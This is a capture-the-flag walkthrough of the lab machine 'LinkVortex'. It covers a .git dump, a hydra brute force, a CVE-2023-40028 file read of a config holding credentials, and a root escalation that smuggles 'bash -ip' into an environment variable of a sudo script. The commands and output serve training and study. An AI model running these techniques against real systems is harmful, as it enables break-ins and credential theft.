## Intro


tags: #OSCPpath #linux #WebApp #git #BruteForce #codereview #unknown-binary #easy 

----
# Reconnaissance

```shell
source basher target1 10.129.231.194 [IP]
source basher host1 linkvortex.htb [host]

echo "$target1 $host1" | sudo tee -a /etc/hosts
```

## Port scan
### Identify open  TCP ports fast
```shell
sudo nmap -p- --open -sS --min-rate 5000 -Pn -n $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-19 14:18 -0400
Nmap scan report for 10.129.231.194
Host is up (0.14s latency).
Not shown: 56911 closed tcp ports (reset), 8622 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 20.70 seconds
```

### Scan specific open TCP ports
```shell
sudo nmap -p22,80 -A $target1
```

```shell
Starting Nmap 7.98 ( https://nmap.org ) at 2026-09-19 14:18 -0400
Nmap scan report for linkvortex.htb (10.129.231.194)
Host is up (0.049s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:f8:b9:68:c8:eb:57:0f:cb:0b:47:b9:86:50:83:eb (ECDSA)
|_  256 a2:ea:6e:e1:b6:d7:e7:c5:86:69:ce:ba:05:9e:38:13 (ED25519)
80/tcp open  http    Apache httpd
|_http-title: BitByBit Hardware
| http-robots.txt: 4 disallowed entries 
|_/ghost/ /p/ /email/ /r/
|_http-server-header: Apache
|_http-generator: Ghost 5.58
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 443/tcp)
HOP RTT      ADDRESS
1   49.57 ms 10.10.14.1
2   49.82 ms linkvortex.htb (10.129.231.194)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 11.46 seconds
```

### Identify open UDP ports

```shell
sudo nmap -p- --open -sU --min-rate 5000 -Pn -n $target1
```
no ports found

## Webapp

`http://linkvortex.htb/`
![](MediaFiles/Pasted%20image%2020260919211255.png)
found cms ghost version `5.58`
![](MediaFiles/Pasted%20image%2020260919211320.png)
lets check this version for exploits m found only authenticated ones and since we have no creds yet we cant move forward, also no default creds found/worked

### Directories

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -u http://$target1/FUZZ
```
nothing found

### Subdomains

```shell
gobuster dns --domain $target1 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50
```
nothing

### Vhosts enumeration

```shell
curl -s http://$target1 | wc -c
230
```

```shell
gobuster vhost -u http://linkvortex.htb \
  -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain --exclude-length 230 -t 50
```

```shell
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://linkvortex.htb
[+] Method:                    GET
[+] Threads:                   50
[+] Wordlist:                  /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Length:            230
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
dev.linkvortex.htb Status: 200 [Size: 2538]
#www.linkvortex.htb Status: 400 [Size: 226]
#mail.linkvortex.htb Status: 400 [Size: 226]
Progress: 19966 / 19966 (100.00%)
===============================================================
Finished
===============================================================
```
found dev subdomain, lets add it to etc hosts

or with ffuf
```shell
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://linkvortex.htb/ \
  -H "Host: FUZZ.linkvortex.htb" \
  -mc 200
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://linkvortex.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.linkvortex.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

dev                     [Status: 200, Size: 2538, Words: 670, Lines: 116, Duration: 78ms]
```
found dev subdomain, lets add it to etc hosts

## Subdomain enumeration

![](MediaFiles/Pasted%20image%2020260919212634.png)

### Directories

```shell
ffuf -w /usr/share/seclists/Discovery/Web-Content/quickhits.txt \
  -u http://dev.linkvortex.htb/FUZZ \
  -mc 200,301,302,403
```

```shell

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://dev.linkvortex.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/quickhits.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,301,302,403
________________________________________________

.git                    [Status: 301, Size: 239, Words: 14, Lines: 8, Duration: 58ms]
.git/                   [Status: 200, Size: 2796, Words: 186, Lines: 26, Duration: 60ms]
.git/logs/              [Status: 200, Size: 868, Words: 59, Lines: 16, Duration: 59ms]
.git/logs/HEAD          [Status: 200, Size: 175, Words: 8, Lines: 2, Duration: 64ms]
.git/HEAD               [Status: 200, Size: 41, Words: 1, Lines: 2, Duration: 65ms]
.git/config             [Status: 200, Size: 201, Words: 14, Lines: 9, Duration: 83ms]
.ht_wsr.txt             [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 60ms]
.hta                    [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 56ms]
.htaccess.old           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 56ms]
.htaccess.BAK           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 57ms]
.htaccess.bak1          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 57ms]
.htaccess-marco         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 56ms]
.htaccess-dev           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 57ms]
.htaccess               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 57ms]
.htaccess.bak           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 57ms]
.htaccess_orig          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 51ms]
.htaccess_extra         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 51ms]
.htaccess.sample        [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 56ms]
.htaccess_sc            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 56ms]
.htaccess.txt           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 58ms]
.htaccess-local         [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 65ms]
.htaccess.orig          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 64ms]
.htaccess.save          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 63ms]
.htaccessOLD2           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 50ms]
.htaccessBAK            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 52ms]
.htaccess~              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 50ms]
.htgroup                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 50ms]
.htaccessOLD            [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 53ms]
.htpasswd               [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 53ms]
.htpasswd-old           [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 53ms]
.htpasswd_test          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 53ms]
.htpasswds              [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 53ms]
.htusers                [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 61ms]
.git/index              [Status: 200, Size: 707577, Words: 2171, Lines: 2172, Duration: 89ms]
server-status/          [Status: 403, Size: 199, Words: 14, Lines: 8, Duration: 60ms]
:: Progress: [2565/2565] :: Job [1/1] :: 751 req/sec :: Duration: [0:00:03] :: Errors: 0 ::

```
interesting, `.git` exists, lets enumerate it

## .git enumeration

install git dumper
```shell
sudo apt install pipx -y
pipx ensurepath
pipx install git-dumper
```
run
```shell
git-dumper http://dev.linkvortex.htb .git
```
lets print all contents of all dirs and cat them into a file
```shell
find . -print | sort | awk -F/ '{indent=""; for(i=2;i<NF;i++) indent=indent"│   "; print indent"├── "$NF}' > cat.txt
```

```shell
└─$ git show    
                                                
commit 299cdb4387763f850887275a716153e84793077d (HEAD, tag: v5.58.0)
Author: Ghost CI <41898282+github-actions[bot]@users.noreply.github.com>
Date:   Fri Aug 4 15:02:54 2023 +0000

    v5.58.0

diff --git a/ghost/admin/package.json b/ghost/admin/package.json
index 7810d46..b30d462 100644
--- a/ghost/admin/package.json
+++ b/ghost/admin/package.json
@@ -1,6 +1,6 @@
 {
   "name": "ghost-admin",
-  "version": "5.57.3",
+  "version": "5.58.0",
   "description": "Ember.js admin client for Ghost",
   "author": "Ghost Foundation",
   "homepage": "http://ghost.org",
diff --git a/ghost/core/package.json b/ghost/core/package.json
index 8ef2863..450a52d 100644
--- a/ghost/core/package.json
+++ b/ghost/core/package.json
@@ -1,6 +1,6 @@
 {
   "name": "ghost",
-  "version": "5.57.3",
+  "version": "5.58.0",
   "description": "The professional publishing platform",
   "author": "Ghost Foundation",
   "homepage": "https://ghost.org",


```
restore commit
```shell
git restore .
git diff 299cdb4387763f850887275a716153e84793077d
```
check diff
```shell
diff --git a/Dockerfile.ghost b/Dockerfile.ghost
new file mode 100644
index 0000000..50864e0
--- /dev/null
+++ b/Dockerfile.ghost
@@ -0,0 +1,16 @@
+FROM ghost:5.58.0
+
+# Copy the config
+COPY config.production.json /var/lib/ghost/config.production.json
+
+# Prevent installing packages
+RUN rm -rf /var/lib/apt/lists/* /etc/apt/sources.list* /usr/bin/apt-get /usr/bin/apt /usr/bin/dpkg /usr/sbin/dpkg /usr/bin/dpkg-deb /usr/sbin/dpkg-deb
+
+# Wait for the db to be ready first
+COPY wait-for-it.sh /var/lib/ghost/wait-for-it.sh
+COPY entry.sh /entry.sh
+RUN chmod +x /var/lib/ghost/wait-for-it.sh
+RUN chmod +x /entry.sh
+
+ENTRYPOINT ["/entry.sh"]
+CMD ["node", "current/index.js"]
diff --git a/ghost/core/test/regression/api/admin/authentication.test.js b/ghost/core/test/regression/api/admin/authentication.test.js
index 2735588..e654b0e 100644
--- a/ghost/core/test/regression/api/admin/authentication.test.js
+++ b/ghost/core/test/regression/api/admin/authentication.test.js
@@ -53,7 +53,7 @@ describe('Authentication API', function () {
 
         it('complete setup', async function () {
             const email = 'test@example.com';
-            const password = 'thisissupersafe';
+            const password = 'OctopiFociPilfer45';
 
             const requestMock = nock('https://api.github.com')
                 .get('/repos/tryghost/dawn/zipball')

```

#### creds obtained

```shell
test@example.com
thisissupersafe
OctopiFociPilfer45
```

lets get more creds and create a wordlist
```shell
grep -Ehair "password\ ?[=|:]\ ?[\'|\"]\w{1,}[\'|\"]" | sed -E -e 's/^\s{1,}//g' | sort -u | awk -v FS=': ' '{print $2}' | sed -E -e "s/['|\"|,|;]//g" | grep -v '^$' | sort -u | grep -vE '\(|\)|{|}' > temp.txt

grep -Ehair "password\ ?[=|:]\ ?[\'|\"]\w{1,}[\'|\"]" | sed -E -e 's/^\s{1,}//g' | sort -u | awk -v FS=' = ' '{print $2}' | sed -E -e "s/['|\"|,|;]//g" | grep -vE '^$|\{' | sort -u >> temp.txt

cat temp.txt | sort -u > wordlist.txt
```
now that we have some creds, lets do a brute force so we can hop back to the ghost exploit we found at the start if we find valid login creds

## Bruteforce

```shell
hydra -I -f -V -l 'admin@linkvortex.htb' -P ./wordlist.txt 'http-post-form://linkvortex.htb/ghost/api/admin/session:{"username"\: "^USER^", "password"\: "^PASS^"}:H=X-Ghost-Version\: 5.58:H=Content-Type\: application/json;charset=UTF-8:F=422'
```

```shell
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-09-19 14:45:11
[INFORMATION] escape sequence \: detected in module option, no parameter verification is performed.
[DATA] max 16 tasks per 1 server, overall 16 tasks, 23 login tries (l:1/p:23), ~2 tries per task
[DATA] attacking http-post-form://linkvortex.htb:80/ghost/api/admin/session:{"username"\: "^USER^", "password"\: "^PASS^"}:H=X-Ghost-Version\: 5.58:H=Content-Type\: application/json;charset=UTF-8:F=422
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "1231111111" - 1 of 23 [child 0] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "123456" - 2 of 23 [child 1] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "12345678" - 3 of 23 [child 2] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "123456789" - 4 of 23 [child 3] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "1234567890" - 5 of 23 [child 4] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "12345678910" - 6 of 23 [child 5] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "cdcdcdcdcd" - 7 of 23 [child 6] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "hunter2" - 8 of 23 [child 7] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "invalid_password" - 9 of 23 [child 8] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "lel123456" - 10 of 23 [child 9] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "mynewfancypasswordwhichisnotallowed" - 11 of 23 [child 10] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "newpassword" - 12 of 23 [child 11] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "OctopiFociPilfer45" - 13 of 23 [child 12] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "onepassword" - 14 of 23 [child 13] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "parseword" - 15 of 23 [child 14] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "password" - 16 of 23 [child 15] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "private" - 17 of 23 [child 11] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "qu33nRul35" - 18 of 23 [child 5] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "root" - 19 of 23 [child 7] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "Sl1m3rson99" - 20 of 23 [child 9] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "string" - 21 of 23 [child 14] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "superSecure" - 22 of 23 [child 0] (0/0)
[ATTEMPT] target linkvortex.htb - login "admin@linkvortex.htb" - pass "thisissupersafe" - 23 of 23 [child 2] (0/0)
[80][http-post-form] host: linkvortex.htb   login: admin@linkvortex.htb   password: OctopiFociPilfer45
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-09-19 14:45:15
```

```shell
admin@linkvortex.htb 
OctopiFociPilfer45
```

-------
# Foothold

## Admin login

login on `http://linkvortex.htb/ghost/#/signin` we are in
![](MediaFiles/Pasted%20image%2020260919215032.png)

Remember the location of the production configuration file? **/var/lib/ghost/config.production.json**. Let’s check this out:
```shell
./CVE-2023-40028.sh -u admin@linkvortex.htb -p OctopiFociPilfer45  
WELCOME TO THE CVE-2023-40028 SHELL  
file> /var/lib/ghost/config.production.json  
{  
"url": "http://localhost:2368",  
"server": {  
"port": 2368,  
"host": "::"  
},  
"mail": {  
"transport": "Direct"  
},  
"logging": {  
"transports": ["stdout"]  
},  
"process": "systemd",  
"paths": {  
"contentPath": "/var/lib/ghost/content"  
},  
"spam": {  
"user_login": {  
"minWait": 1,  
"maxWait": 604800000,  
"freeRetries": 5000  
}  
},  
"mail": {  
"transport": "SMTP",  
"options": {  
"service": "Google",  
"host": "linkvortex.htb",  
"port": 587,  
"auth": {  
"user": "bob@linkvortex.htb",  
"pass": "fibber-talented-worth"  
}  
}  
}  
}  
file> ^C
```
#### creds obtained
```shell
bob@linkvortex.htb
fibber-talented-worth
```

## Shell as bob

```shell
└─$ ssh bob@linkvortex.htb                                                                                                       
The authenticity of host 'linkvortex.htb (10.129.231.194)' can't be established.
ED25519 key fingerprint is: SHA256:vrkQDvTUj3pAJVT+1luldO6EvxgySHoV6DPCcat0WkI
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'linkvortex.htb' (ED25519) to the list of known hosts.
bob@linkvortex.htb's password: 
Permission denied, please try again.
bob@linkvortex.htb's password: 
Permission denied, please try again.
bob@linkvortex.htb's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 6.5.0-27-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Tue Dec  3 11:41:50 2024 from 10.10.14.62
bob@linkvortex:~$ cat user.txt 
24377724079b623e1f8e5ee43bd4c62d
bob@linkvortex:~$ id
uid=1001(bob) gid=1001(bob) groups=1001(bob)
bob@linkvortex:~$ 

```

----
# Privesc


```shell
bob@linkvortex:~$ sudo -l
Matching Defaults entries for bob on linkvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_keep+=CHECK_CONTENT

User bob may run the following commands on linkvortex:
    (ALL) NOPASSWD: /usr/bin/bash /opt/ghost/clean_symlink.sh *.png

```

## Custom script

lets view the bash script
```bash
#!/bin/bash

QUAR_DIR="/var/quarantined"

if [ -z $CHECK_CONTENT ];then
  CHECK_CONTENT=false
fi

LINK=$1

if ! [[ "$LINK" =~ \.png$ ]]; then
  /usr/bin/echo "! First argument must be a png file !"
  exit 2
fi

if /usr/bin/sudo /usr/bin/test -L $LINK;then
  LINK_NAME=$(/usr/bin/basename $LINK)
  LINK_TARGET=$(/usr/bin/readlink $LINK)
  if /usr/bin/echo "$LINK_TARGET" | /usr/bin/grep -Eq '(etc|root)';then
    /usr/bin/echo "! Trying to read critical files, removing link [ $LINK ] !"
    /usr/bin/unlink $LINK
  else
    /usr/bin/echo "Link found [ $LINK ] , moving it to quarantine"
    /usr/bin/mv $LINK $QUAR_DIR/
    if $CHECK_CONTENT;then
      /usr/bin/echo "Content:"
      /usr/bin/cat $QUAR_DIR/$LINK_NAME 2>/dev/null
    fi
  fi
fi

```

Explanation: if i did the symlink directly to root/root.txt, it detected it "Trying to read critical files, removing lin"
but when i did a "double" symlink then it worked
```shell
bob@linkvortex:~$ ln -s /root/root.txt rooted.png
bob@linkvortex:~$ ln -s rooted.png ch3ckm8.png
bob@linkvortex:~$ CHECK_CONTENT='bash -ip' sudo /usr/bin/bash /opt/ghost/clean_symlink.sh ch3ckm8.png
/opt/ghost/clean_symlink.sh: line 5: [: bash: binary operator expected
Link found [ ch3ckm8.png ] , moving it to quarantine
root@linkvortex:/home/bob# whoami
root
root@linkvortex:/home/bob# id
uid=0(root) gid=0(root) groups=0(root)
root@linkvortex:/home/bob# cat /root/root.txt
c00778e99f593cbeb697e2fd430e7677
root@linkvortex:/home/bob# 
```
so symnlinks i created are:
```
lrwxrwxrwx 1 bob  bob    14 Sep 19 19:46 rooted.png -> /root/root.txt
lrwxrwxrwx 1 bob  bob     9 Sep 19 19:48 ch3ckm8.png -> rooted.png
```
ended at 22:36, under 2 hours